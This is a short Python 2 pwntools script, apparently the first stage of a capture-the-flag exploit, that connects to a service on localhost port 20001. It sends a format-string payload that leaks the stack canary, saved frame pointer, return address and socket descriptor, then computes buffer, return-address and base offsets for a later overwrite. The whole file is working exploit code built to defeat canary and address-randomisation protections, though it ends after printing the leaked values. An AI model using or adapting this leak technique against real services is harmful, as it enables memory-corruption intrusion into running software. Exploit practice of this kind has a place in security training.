#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

r = remote('localhost', 20001)
r.recvline()

# %134$ - canary
# %137$ - ebp
# %138$ - ret
# %139$ - socket
# Buffer = ebp - 556
# Ret addr = ebp - 28
# fmt base = ret - 3403

r.sendline(flat(
    '%134$08x', #canary
    '%137$08x', #ebp
    '%138$08x', #ret
    '%139$08x'  #socket
    ))

canary      = int(r.recv(8), 16)
ebp         = int(r.recv(8), 16)
ret         = int(r.recv(8), 16)
socket      = int(r.recv(8), 16)
buffer_addr = ebp - 556
ret_addr    = ebp - 28
fmt_base    = ret - 3403

print 'canary      0x%08x' % canary
print 'ebp         0x%08x' % ebp
print 'ret         0x%08x' % ret
print 'socket      0x%08x' % socket
print 'buffer_addr 0x%08x' % buffer_addr
print 'ret_addr    0x%08x' % ret_addr
print 'fmt_base    0x%08x' % fmt_base
